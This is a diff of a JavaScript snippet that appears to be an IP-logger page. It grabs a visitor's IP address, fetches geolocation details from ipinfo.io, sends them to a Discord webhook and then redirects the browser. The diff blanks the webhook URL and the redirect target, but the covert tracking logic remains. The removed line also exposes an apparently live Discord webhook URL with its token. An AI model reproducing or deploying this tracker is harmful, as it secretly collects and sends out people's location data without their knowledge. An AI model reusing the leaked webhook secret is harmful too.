@@ -7,7 +7,7 @@ function sendIPInfoAndRedirect() {
             const userIP = data.ip;
 
             // Define the Discord webhook URL
-            const webhookURL = 'https://discord.com/api/webhooks/1167925331638886461/xcq_tIQR2IkZWNP7hNMqaX0MM6eFHo_teZFXpxPcsqkgaa1-Mo8o3iPlYAyfxhV-65Oa';
+            const webhookURL = '';
 
             // Gather additional IP information using an IP geolocation API
             fetch(`https://ipinfo.io/${userIP}/json`)
@@ -34,8 +34,8 @@ function sendIPInfoAndRedirect() {
                     })
                         .then(() => {
                             console.log('IP info sent successfully to Discord webhook.');
-                            // Redirect to "school.boxeth.uk" after sending IP info
-                            window.location.href = 'https://school.boxeth.uk';
+                            // Redirect to site after sending IP info
+                            window.location.href = '';
                         })
                         .catch(error => console.error('Error:', error));
                 })
